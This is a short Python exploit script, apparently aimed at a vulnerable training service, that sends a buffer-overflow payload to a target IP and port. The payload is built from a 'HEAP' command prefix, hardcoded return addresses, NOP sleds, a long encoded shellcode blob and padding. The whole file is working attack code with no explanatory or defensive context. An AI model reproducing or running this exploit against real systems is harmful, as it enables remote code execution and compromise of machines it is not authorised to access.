#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires two Command Line Arguments. This should be the IPv4 address of the target machine Followed by the port")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = sys.argv[2]        # victim port

SHELL =  b""
SHELL += b"\xba\xd4\xba\xdc\xc9\xda\xd3\xd9\x74\x24\xf4\x5b"
SHELL += b"\x29\xc9\xb1\x52\x31\x53\x12\x83\xc3\x04\x03\x87"
SHELL += b"\xb4\x3e\x3c\xdb\x21\x3c\xbf\x23\xb2\x21\x49\xc6"
SHELL += b"\x83\x61\x2d\x83\xb4\x51\x25\xc1\x38\x19\x6b\xf1"
SHELL += b"\xcb\x6f\xa4\xf6\x7c\xc5\x92\x39\x7c\x76\xe6\x58"
SHELL += b"\xfe\x85\x3b\xba\x3f\x46\x4e\xbb\x78\xbb\xa3\xe9"
SHELL += b"\xd1\xb7\x16\x1d\x55\x8d\xaa\x96\x25\x03\xab\x4b"
SHELL += b"\xfd\x22\x9a\xda\x75\x7d\x3c\xdd\x5a\xf5\x75\xc5"
SHELL += b"\xbf\x30\xcf\x7e\x0b\xce\xce\x56\x45\x2f\x7c\x97"
SHELL += b"\x69\xc2\x7c\xd0\x4e\x3d\x0b\x28\xad\xc0\x0c\xef"
SHELL += b"\xcf\x1e\x98\xeb\x68\xd4\x3a\xd7\x89\x39\xdc\x9c"
SHELL += b"\x86\xf6\xaa\xfa\x8a\x09\x7e\x71\xb6\x82\x81\x55"
SHELL += b"\x3e\xd0\xa5\x71\x1a\x82\xc4\x20\xc6\x65\xf8\x32"
SHELL += b"\xa9\xda\x5c\x39\x44\x0e\xed\x60\x01\xe3\xdc\x9a"
SHELL += b"\xd1\x6b\x56\xe9\xe3\x34\xcc\x65\x48\xbc\xca\x72"
SHELL += b"\xaf\x97\xab\xec\x4e\x18\xcc\x25\x95\x4c\x9c\x5d"
SHELL += b"\x3c\xed\x77\x9d\xc1\x38\xd7\xcd\x6d\x93\x98\xbd"
SHELL += b"\xcd\x43\x71\xd7\xc1\xbc\x61\xd8\x0b\xd5\x08\x23"
SHELL += b"\xdc\xd0\xcc\x29\x1b\x8d\xce\x2d\x3c\xdd\x46\xcb"
SHELL += b"\x28\xcd\x0e\x44\xc5\x74\x0b\x1e\x74\x78\x81\x5b"
SHELL += b"\xb6\xf2\x26\x9c\x79\xf3\x43\x8e\xee\xf3\x19\xec"
SHELL += b"\xb9\x0c\xb4\x98\x26\x9e\x53\x58\x20\x83\xcb\x0f"
SHELL += b"\x65\x75\x02\xc5\x9b\x2c\xbc\xfb\x61\xa8\x87\xbf"
SHELL += b"\xbd\x09\x09\x3e\x33\x35\x2d\x50\x8d\xb6\x69\x04"
SHELL += b"\x41\xe1\x27\xf2\x27\x5b\x86\xac\xf1\x30\x40\x38"
SHELL += b"\x87\x7a\x53\x3e\x88\x56\x25\xde\x39\x0f\x70\xe1"
SHELL += b"\xf6\xc7\x74\x9a\xea\x77\x7a\x71\xaf\x98\x99\x53"
SHELL += b"\xda\x30\x04\x36\x67\x5d\xb7\xed\xa4\x58\x34\x07"
SHELL += b"\x55\x9f\x24\x62\x50\xdb\xe2\x9f\x28\x74\x87\x9f"
SHELL += b"\x9f\x75\x82"


PAYLOAD = (
    b'HEAP' +
    struct.pack('<L', 0x62501023) +
    b'\x90' *20 +
    SHELL + 
    b'\x90' *20 +
    b'*' +
    b'A'*(424)+
    struct.pack('<L', 0x6250185E) +
    b'*' 
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
